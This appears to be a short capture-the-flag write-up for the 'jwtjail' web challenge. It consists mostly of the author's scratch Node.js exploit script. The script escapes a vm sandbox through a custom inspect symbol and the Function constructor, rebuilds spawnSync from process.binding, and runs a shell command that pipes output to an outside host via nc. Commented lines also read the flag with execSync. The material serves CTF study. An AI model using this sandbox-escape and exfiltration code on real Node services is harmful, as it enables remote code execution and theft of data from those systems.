# jwtjail (web)
Writeup located on team site:

https://irissec.xyz/articles/categories/web/2023-02-06/jwtjail

Here lies my scratch script

```js
"use strict";

const jwt = require("jsonwebtoken");
const express = require("express");
const vm = require("vm");

const app = express();

const PORT = process.env.PORT || 12345;

app.use(express.urlencoded({ extended: false }));

const ctx = { codeGeneration: { strings: false, wasm: false }};
let O = { console };
//const unserialize = (data) => new vm.Script(`/*"use strict";*/ (${data})`).runInContext(vm.createContext(Object.create(null), ctx), { timeout: 250 });
const unserialize = (data) => new vm.Script(`"use strict"; (${data})`).runInContext(vm.createContext(O, ctx), { timeout: 250 });
let jwtz = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`;
//({}).constructor.defineProperty(a, "a", {get: function() {const require = this.constructor.constructor('return process.mainModule.require')(); const flag = require('child_process').execSync('cat /flag').toString(); require('console').log(flag); return 1}}
process.mainModule = null; // 🙃
let d =`
(function(q){
//let b = ({}).constructor.getOwnPropertyNames(console);
//let a = {"format":"pem","type":"pkcs1","encoding":"ascii"};
//({}).constructor.defineProperty(a, "key", {get: function(a) {throw arguments.constructor.constructor('console.log(1)')();}});
//({}).constructor.defineProperty(a, "key", {get: function() {
//return ({}).constructor.getOwnPropertyNames(b);
//return arguments.constructor().constructor.constructor('')();
//return ({}).constructor.getOwnPropertyDescriptors(arguments.calller);
//}
//return import("a")
//}});
let O = q.console;
let handler = {
    get(e, a) {
	O.log("==get==");
        O.log(a);
        if(typeof a === 'symbol') {
		O.log("==sym==");
	        O.log("s", a.__proto__.__proto__.constructor.constructor('return 1')());
	}
        if(a == "constructor") {
		O.log("==c==");
		let G = {};
		//Object.defineProperty(G, "name",
		//{get: function() {O.log("==z=="); this.constructor.constructor('return 1')()}}
		//);
        }
        return "ok";
    }
}
/*
a.key = "a";*/
let a = {};
//a = new Proxy(a, handler);
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
//class b  {
let b = {
[customInspectSymbol](d,i,j) {
	O.log("==i==");
	//O.log(d, i.constructor, j.constructor.constructor('return process.binding("child_process").ex:qecSync("/readflag").toString()')());
	let process = j.constructor.constructor('return process')();
        let spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};
	let spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};
	let f = spawnSync('sh', ['-c', 'ls | nc host port']).stdout.toString();
	throw f;
	return "inspect";
}
}
//a.key = new b();
//a = {constructor:  new b()}
//a = new b();
//a.constructor.name = undefined;
a = b;
a.constructor = null;

//let a = "string";
//a.__proto__.split = function(a){return a.constructor.constructor('return process')()};
//a.__proto__.split = function(){return arguments};

return a;
})(this)
`;
const crypto = require('crypto');
/*
(function() {
console.log(unserialize(d).key);
 }())
*/
//try { crypto.createPublicKey(unserialize(d)); } catch(a) {console.log(a)};
//try { crypto.createSecretKey(unserialize(d)); } catch(a) {console.log(a)};
jwt.verify(jwtz,unserialize(d));
```
